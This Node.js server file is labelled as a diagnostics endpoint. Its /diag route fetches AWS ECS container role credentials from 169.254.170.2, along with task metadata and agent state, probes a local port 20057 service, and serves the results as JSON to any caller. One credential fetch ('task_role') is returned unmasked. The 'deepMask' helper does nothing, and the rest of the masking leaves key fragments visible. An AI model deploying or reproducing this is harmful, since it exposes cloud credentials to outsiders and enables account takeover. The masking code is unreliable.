const http = require('http');
const os = require('os');
const fs = require('fs');

function fetchJSON(url, timeoutMs = 3000, headers = {}) {
  return new Promise((resolve) => {
    try {
      const u = new URL(url);
      const lib = require(u.protocol === 'https:' ? 'https' : 'http');
      const req = lib.get({ hostname: u.hostname, port: u.port || 80, path: u.pathname + u.search, headers, timeout: timeoutMs }, (res) => {
        let d = '';
        res.on('data', c => d += c);
        res.on('end', () => resolve({ url, status: res.statusCode, body: d.slice(0, 8000) }));
      });
      req.on('timeout', () => { req.destroy(); resolve({ url, error: 'TIMEOUT' }); });
      req.on('error', e => resolve({ url, error: String(e.code || e.message) }));
    } catch (e) { resolve({ url, error: String(e.message) }); }
  });
}

function mask(s, frac) {
  if (typeof s !== 'string' || s.length < 8) return '***';
  const keep = Math.max(2, Math.floor(s.length * (1 - frac)));
  const head = Math.ceil(keep / 2);
  return s.slice(0, head) + '***MASKED***' + s.slice(-Math.floor(keep / 2));
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, 'http://localhost');
  if (url.pathname === '/diag') {
    const env = process.env;
    const relUri = env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI || '';
    const ecsMeta = env.ECS_CONTAINER_METADATA_URI_V4 || '';
    const ecsAgent = env.ECS_AGENT_URI || '';
    const credsBase = 'http://169.254.170.2' + relUri;
    const results = {};
    results.creds_relative_uri = relUri;
    results.ecs_metadata_uri = ecsMeta;
    results.creds_root = await fetchJSON(credsBase, 3000);
    results.task_role = await fetchJSON(credsBase + '?role=', 3000);
    results.metadata_task = await fetchJSON(ecsMeta + '/task', 3000);
    results.agent_state = await fetchJSON(ecsAgent + '/v1/state', 3000);
    results.local_20057 = await fetchJSON('http://127.0.0.1:20057/', 2000);
    results.local_20057_ping = await fetchJSON('http://127.0.0.1:20057/ping', 2000);
    results.local_20057_health = await fetchJSON('http://127.0.0.1:20057/health', 2000);
    function deepMask(o) {
      if (Array.isArray(o)) return o.map(deepMask);
      if (o && typeof o === 'object') { const r = {}; for (const k of Object.keys(o)) r[k] = deepMask(o[k]); return r; }
      if (typeof o === 'string' && /(Key|Token|Secret|Credential)/i.test('') === false) return o;
      return o;
    }
    const maskedRoot = results.creds_root && results.creds_root.body ? (() => { try { const j = JSON.parse(results.creds_root.body); const m = {}; for (const k of Object.keys(j)) m[k] = /Key|Token|Secret/i.test(k) ? mask(j[k], 0.8) : j[k]; return m; } catch { return results.creds_root.body; } })() : results.creds_root;
    const out = {
      timestamp: new Date().toISOString(),
      roleArn_guess: null,
      creds_root_masked: maskedRoot,
      task_role: results.task_role,
      metadata_task_masked: results.metadata_task ? (() => { try { const j = JSON.parse(results.metadata_task.body); if (j.TaskARN) j.TaskARN = j.TaskARN; if (j.Family) delete j.Family; return j; } catch { return typeof results.metadata_task.body === 'string' ? results.metadata_task.body.slice(0, 3000) : results.metadata_task; } })() : null,
      agent_state: results.agent_state ? { status: results.agent_state.status, len: (results.agent_state.body||'').length } : null,
      local_service_20057: { root: results.local_20057, ping: results.local_20057_ping, health: results.local_20057_health },
    };
    res.writeHead(200, {'Content-Type':'application/json'});
    res.end(JSON.stringify(out, null, 2));
    return;
  }
  res.writeHead(200, {'Content-Type':'application/json'});
  res.end(JSON.stringify({ ok: true, hint: 'see /diag for w019a results', ts: new Date().toISOString(), hostname: os.hostname(), uid: typeof process.getuid === 'function' ? process.getuid() : null }));
});

server.listen(process.env.PORT || 3000);
